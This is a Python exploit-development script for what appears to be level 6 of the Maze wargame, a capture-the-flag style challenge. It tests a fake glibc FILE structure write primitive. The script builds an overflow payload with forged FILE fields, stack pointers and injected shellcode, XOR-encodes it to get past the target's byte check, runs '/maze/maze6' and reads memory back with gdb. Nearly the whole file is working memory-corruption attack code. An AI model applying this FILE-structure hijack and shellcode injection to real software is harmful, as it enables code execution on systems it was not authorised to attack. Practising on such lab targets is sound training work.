#!/usr/bin/env python3
"""Test the fake-FILE write mechanism alone: aim the fprintf line at .bss scratch."""
import subprocess, struct, importlib.util, sys

spec = importlib.util.spec_from_file_location("exploit", "/run/screen/l6/exploit.py")
ex = importlib.util.module_from_spec(spec)
spec.loader.exec_module(ex)

sc = open("/run/screen/l6/sc.bin", "rb").read()
path = b"/run/screen/l6/wX.txt"
SCRATCH = 0x0804B400
buf = 0xffffd8b4

line_prefix = len(path) + 3
fake = buf + ex.FAKE_OFF
wbase = SCRATCH

p = bytearray(b"A" * 0x100)
p[0:4] = b"AAAA"                                   # buf[0..4]: no gadget (scratch test)
p += struct.pack("<I", fake)
p += struct.pack("<I", ex.SAVED_EBX)
p += struct.pack("<I", buf + ex.SC_OFF)
p += struct.pack("<I", 3)
p += struct.pack("<I", buf + ex.ARGV_OFF)
p += struct.pack("<I", buf + ex.ARGV_OFF + 0x10)
p += b"B" * (ex.ARGV_OFF - len(p))
p += struct.pack("<I", buf + ex.STR_A0)
p += struct.pack("<I", buf + ex.STR_A1)
p += struct.pack("<I", buf + ex.STR_A2)
p += struct.pack("<I", 0)
p += b"C" * (ex.FAKE_OFF - len(p))
fp = bytearray(bytes.fromhex(
    "84 3c ad fb 50 c1 04 08 50 c1 04 08 50 c1 04 08"
    "50 c1 04 08 6d c1 04 08 50 d1 04 08 50 c1 04 08"
    "50 d1 04 08 00 00 00 00 00 00 00 00 00 00 00 00"
    "00 00 00 00 40 3c fa f7 03 00 00 00 00 00 00 00"
    "00 00 00 00 a8 c0 04 08 ff ff ff ff ff ff ff ff"
    "00 00 00 00 b4 c0 04 08 00 00 00 00 00 00 00 00"
    "20 3c fa f7 ff ff ff ff 00 00 00 00 00 00 00 00"
    "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
    "00 00 00 00 00 00 00 00 a8 27 fa f7".replace(" ", "").replace("\n", "")
))
fp[0x10:0x14] = struct.pack("<I", wbase)
fp[0x14:0x18] = struct.pack("<I", wbase)
fp[0x18:0x1c] = struct.pack("<I", wbase + 0x800)
p += fp
p += b"C" * (ex.SC_OFF - (ex.FAKE_OFF + 0x8C))
p += sc

assert 0x2a not in p, [i for i, b in enumerate(p) if b == 0x2a][:5]
argv2 = bytes(b ^ 42 for b in p)
assert 0 not in argv2

r = subprocess.run(["/maze/maze6", path, argv2], capture_output=True)
print("rc", r.returncode, "stdout", r.stdout[:60])
# check the scratch via a second run? use gdb:
g = subprocess.run(["gdb", "-q", "-batch",
    "-ex", "break *0x804928b",
    "-ex", "run",
    "-ex", "x/8xw 0x0804b400",
    "-ex", "x/4xw 0x0804b228",
    "--args", "./m6", path, argv2], capture_output=True)
out = g.stdout.decode("latin-1")
import re
for m in re.finditer(r"0x804b[0-9a-f]+ <[^>]*>:\s*(.*)", out):
    print(m.group(0))
if "SIGSEGV" in out:
    print("still SIGSEGV")
